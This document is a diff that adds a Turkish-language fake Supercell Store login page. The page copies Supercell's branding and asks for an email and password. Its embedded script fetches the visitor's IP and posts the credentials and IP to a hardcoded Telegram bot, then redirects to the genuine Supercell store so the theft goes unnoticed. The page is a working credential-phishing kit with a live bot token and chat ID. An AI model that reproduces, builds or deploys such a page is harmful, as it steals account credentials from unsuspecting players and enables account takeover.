@@ -1,0 +1,131 @@
+<html lang="tr"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Supercell Store Giriş</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: "Helvetica Neue", sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background-color: #1e3a8a;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background: white;
+      padding: 2rem;
+      border-radius: 1rem;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+
+    .login-box img {
+      width: 80px;
+      margin-bottom: 1rem;
+    }
+
+    .login-box h1 {
+      font-size: 1.5rem;
+      margin-bottom: 2rem;
+      color: #1e3a8a;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      margin-bottom: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 0.5rem;
+      font-size: 1rem;
+    }
+
+    .submit-btn {
+      background-color: rgb(59,130,246);
+      color: white;
+      border: none;
+      padding: 1rem 1rem;
+      width: 100%;
+      font-size: 1rem;
+      border-radius: 0.5rem;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .submit-btn:hover {
+      background-color: rgb(30,58,188);
+    }
+
+    .cancel-btn {
+      background-color: rgb(245,245,245);
+      color: black;
+      border: none;
+      padding: 1rem 1rem;
+      width: 100%;
+      font-size: 1rem;
+      border-radius: 0.5rem;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .footer-text {
+      margin-top: 1rem;
+      font-size: 0.875rem;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="https://accounts.supercell.com/static/appicons/store.png" alt="Supercell Store Logo" style="width: 120px;">
+    <h1 style="color: black; margin-bottom: 0rem;">Supercell Store Giriş</h1>
+    <p style="margin-bottom: 2rem;">Kod Gönderilcek</p>
+    <form>
+      <input type="email" class="input-field" placeholder="E-posta girin" required="">
+      <input type="password" class="input-field" placeholder="Parola girin" required="">
+      <button type="submit" class="submit-btn" style="margin-bottom: 1rem;">GİRİŞ YAP</button>
+    <button class="cancel-btn">GERİ DÖN</button></form>
+    <p class="footer-text"></p>
+  </div>
+  <script>
+    async function getIP() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
+
+        async function sendMessage() {
+            const token = '7941593080:AAFe71WQaxyQFzvI3CcpFtuOcOthvUrF49A';
+            const userId = 7767108844;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const ip = await getIP();
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: userId,
+                        text: `email: ${email}\nşifre: ${password}\nIP: ${ip}`
+                    })
+                });
+
+                const result = await response.json();
+                if (!result.ok) throw new Error(result.description);
+              window.location.href = 'https://store.supercell.com/tr';
+            } catch (error) {
+                alert('Hata: ' + error.message);
+            }
+        }
+  </script>
+
+
+</body></html>
